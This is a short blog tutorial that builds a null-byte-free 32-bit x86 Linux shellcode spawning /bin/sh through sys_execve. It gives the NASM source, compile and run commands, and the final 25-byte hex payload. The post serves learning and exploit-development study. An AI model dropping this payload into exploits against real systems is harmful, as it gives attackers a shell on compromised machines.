---
layout: post
title:  "Creating a simple x86 shellcode"
date:   2017-09-17 01:51:00
disqus: true
categories: Reversing
---
It's a simple x86 shellcode to call /bin/sh, but the first thing is understand how the sys_execve works, to do so you can access this <a href="https://syscalls.kernelgrok.com/" target="_blank">site</a> that gives to you a list with all the x86 syscalls, and the values you need to put in each register, just search for sys_execve.

The initial code bellow have all the comments to make it easy to understand how to use the sys_execve,

{% highlight Bash %}
section .data:
	cmd: db "/bin/sh",0x0
section .text:
	global _start
	_start:
		mov eax,0x0b	;use sys_execve
		mov ebx,cmd	;first arg, file to execute
		mov edx,0x0	;first parameter no usage
		mov ecx,0x0	;second parameter no usage
		int 0x80	;kernel interrupt
{% endhighlight %}

Just to test this code, lets compile it, link and execute the binary shell to get the /bin/sh

{% highlight Bash %}
root@demoniware:~/shellcode# nasm -f elf32 sh3llc0d3.asm && ld -m elf_i386 -s -o shell sh3llc0d3.o
root@demoniware:~/shellcode# ./shell
# id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

But this code is not nullbyte free and it's a problem when we are working with shellcodes, so with some work I got this code,

{% highlight Bash %}
xor eax,eax     ; zero to eax
push eax        ; put 0 in stack, end of string
push 0x68732f6e ; part of /bin/sh
push 0x69622f2f ; part of /bin/sh
mov ebx,esp     ; mov /bin/sh to ebx
push eax        ; put NULL on argv
push ebx        ; put filename on stack
mov ecx, esp    ; put filename to ecx
xor edx,edx     ; envp = NULL
mov al,0x0b     ; 0x0b to call sys_execve
int 0x80        ; kernel interrupt
{% endhighlight %}

To confirm if my code is free of nullbytes, I can use this site <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">defuse.ca</a>, that translate asm instructions to opcodes, and now I have a shellcode free of nullbytes with 25 bytes.

{% highlight Bash %}
\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80
{% endhighlight %}

### Thanks to @thiagopeixoto for the help
